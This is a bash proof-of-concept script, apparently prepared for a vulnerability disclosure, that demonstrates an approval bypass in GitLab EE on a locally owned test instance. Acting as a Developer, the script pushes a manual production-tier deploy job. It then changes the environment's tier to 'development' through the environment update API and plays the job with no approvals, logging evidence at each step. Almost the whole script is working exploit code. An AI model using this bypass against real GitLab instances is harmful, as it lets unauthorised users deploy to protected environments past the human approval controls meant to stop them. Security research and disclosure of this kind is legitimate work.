#!/usr/bin/env bash
# =============================================================================
# PoC: Environment tier change bypasses deployment approvals (GitLab EE)
# Tested on: GitLab EE 19.5.1, self-managed, Ultimate trial license
# All requests run against a locally-owned instance.
# Prereqs: group-level PE on tier "production" (deploy: Developers+Maintainers,
#          approval rule: Maintainers x1); attacker = Developer (project+group).
# =============================================================================
set -e
B="${GITLAB_URL:-http://localhost:8081/api/v4}"
PROJ="acme%2Fapp"
ATK="${ATK_TOKEN:?set ATK_TOKEN to attacker PAT}"
ADM="${ROOT_TOKEN:?set ROOT_TOKEN to admin PAT for setup-only steps}"
EV="$(pwd)/poc-evidence"; mkdir -p "$EV"

step() { echo; echo "=== $1 ==="; }

step "0. (Setup-only, admin) group-level PE: tier production, deploy 30, approval Maintainers x1"
curl -s -X POST -H "PRIVATE-TOKEN: $ADM" -H "Content-Type: application/json" \
  "$B/groups/acme/protected_environments" \
  -d '{"name":"production","deploy_access_levels":[{"access_level":30}]}' | tee "$EV/0_group_pe.json"
curl -s -X PUT -H "PRIVATE-TOKEN: $ADM" -H "Content-Type: application/json" \
  "$B/groups/acme/protected_environments/production" \
  -d '{"approval_rules":[{"access_level":40,"required_approvals":1}]}' | tee "$EV/0b_rule.json"

step "1. Attacker pushes deploy job for env 'website' (tier production) on workloads/* branch"
curl -s -X POST -H "PRIVATE-TOKEN: $ATK" "$B/projects/$PROJ/repository/branches?branch=workloads%2Fpoc&ref=main" -o /dev/null
cat > /tmp/poc_ci.json <<EOF
{"branch":"workloads/poc","commit_message":"poc","actions":[{"action":"update","file_path":".gitlab-ci.yml","content":"deploy-website:\n  stage: deploy\n  script: echo deploy\n  environment:\n    name: website\n    deployment_tier: production\n  when: manual\n"}]}
EOF
curl -s -X POST -H "PRIVATE-TOKEN: $ATK" -H "Content-Type: application/json" -d @/tmp/poc_ci.json \
  "$B/projects/$PROJ/repository/commits" | tee "$EV/1_commit.json" | grep -o '"short_id":"[^"]*"'
PIPE=$(curl -s -X POST -H "PRIVATE-TOKEN: $ATK" "$B/projects/$PROJ/pipeline?ref=workloads%2Fpoc" | grep -o '"id":[0-9]*' | head -1 | cut -d: -f2)
sleep 12
JOB=$(curl -s -H "PRIVATE-TOKEN: $ATK" "$B/projects/$PROJ/pipelines/$PIPE/jobs" | grep -B2 '"deploy-website"' >/dev/null; curl -s -H "PRIVATE-TOKEN: $ATK" "$B/projects/$PROJ/pipelines/$PIPE/jobs" | python -c "import json,sys; print([j['id'] for j in json.load(sys.stdin) if j['name']=='deploy-website'][0])")
ENV_ID=$(curl -s -H "PRIVATE-TOKEN: $ATK" "$B/projects/$PROJ/environments?search=website" | python -c "import json,sys; print([e['id'] for e in json.load(sys.stdin) if e['name']=='website'][0])")
echo "pipeline=$PIPE job=$JOB env=$ENV_ID"
curl -s -H "PRIVATE-TOKEN: $ATK" "$B/projects/$PROJ/deployments" | tee "$EV/1_blocked.json" | \
  python -c "import json,sys; [print('dep',d['id'],d['environment']['name'],d['status']) for d in json.load(sys.stdin) if d['environment']['name']=='website']"

step "2. CONTROL: play while approval pending (expect 403)"
curl -s -w "\nHTTP:%{http_code}\n" -X POST -H "PRIVATE-TOKEN: $ATK" \
  "$B/projects/$PROJ/jobs/$JOB/play" | tee "$EV/2_control_403.txt"

step "3. ATTACK: attacker (deployer, NOT approver) flips tier via env update API"
curl -s -w "\nHTTP:%{http_code}\n" -X PUT -H "PRIVATE-TOKEN: $ATK" \
  "$B/projects/$PROJ/environments/$ENV_ID?tier=development" | tee "$EV/3_tier_flip.txt"

step "4. Play now succeeds; deployment runs with zero approvals"
curl -s -w "\nHTTP:%{http_code}\n" -X POST -H "PRIVATE-TOKEN: $ATK" \
  "$B/projects/$PROJ/jobs/$JOB/play" | tee "$EV/4_play_200.txt" | head -c 200
sleep 25
curl -s -H "PRIVATE-TOKEN: $ATK" "$B/projects/$PROJ/deployments?environment=website&sort=desc" | tee "$EV/4_final_deployments.json" | \
  python -c "import json,sys; [print('dep',d['id'],d['status'],'user:',d['user']['username']) for d in json.load(sys.stdin)[:3]]"

step "5. Confirm no approval rows exist for this deployment"
DEP=$(python -c "import json; print(json.load(open('$EV/4_final_deployments.json'))[0]['id'])")
curl -s -H "PRIVATE-TOKEN: $ATK" "$B/projects/$PROJ/deployments/$DEP" | tee "$EV/5_deployment.json" | \
  python -c "import json,sys; d=json.load(sys.stdin); print('final:', d['status'], '| approvals:', d.get('approval_summary',{}))"
echo "DONE - evidence in $EV"
